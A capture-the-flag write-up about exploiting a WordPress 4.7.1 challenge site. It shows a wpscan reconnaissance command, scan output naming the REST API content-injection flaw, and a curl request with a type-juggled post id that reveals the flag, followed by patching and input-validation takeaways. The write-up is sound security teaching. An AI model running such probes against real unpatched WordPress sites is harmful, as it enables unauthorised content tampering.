# PHP Fly Casting

## Brief

```
Goal: Exploit Wordpress.

# Reconnaissance

Wordpress! Hooray! Wordpress has a reputation for being exploitable - while the Wordpress developers do patch vulnerabilities
as they find them, there are many, many unpatched Wordpress installations out there. There's a reason why the Script Kiddies 
are constantly scanning your non-Wordpress servers for `/wp-admin/`!

So, let's start by finding out more about this Wordpress install. The easiest way is with [`wpscan`](https://wpscan.org/). WPScan
will tell us about the version of Wordpress that is installed, any common plugins, themes, etc., and any known vulnerabilities in
the installed version. It can also try to brute-force the login, but we already know from the contest rules that brute-forcing
is not necessary.

```
wpscan -u https://api.voldemortensen.com
```

```

So, they're running Wordpress 4.7.1, they've got the xmlrpc and wp-json APIs enabled, and there is one user, named `admin`.

So, there are a lot of vulnerabilities here. We can research them, starting with those that look the most interesting.

One that stands out is this one:

```
[!] Title: WordPress 4.7.0-4.7.1 - Unauthenticated Page/Post Content Modification via REST API
    Reference: https://wpvulndb.com/vulnerabilities/8734
    Reference: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
    Reference: https://blogs.akamai.com/2017/02/wordpress-web-api-vulnerability.html

    Reference: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_content_injection
[i] Fixed in: 4.7.2
```

If you read the [Sucuri](https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html) article,
you find out that this vulnerability is partially due to some unvalidated type casting that is happening in the PHP code - hey,
that's like the name of the challenge!  We must be on the right track!

So, let's see if this site is vulnerable:

```
curl 'https://api.voldemortensen.com/wp-json/wp/v2/posts/1?id=2'

{"code":"rest_post_invalid_id","message":"FLAG{DYNAMIC_TYPING_CAN_RUIN_YOUR_DAY}","data":{"status":404}}
```

Hooray!  A flag!

# Takeaways

1. Patch your servers! Unpatched servers are a script kiddie's playground.
2. Validate your inputs!
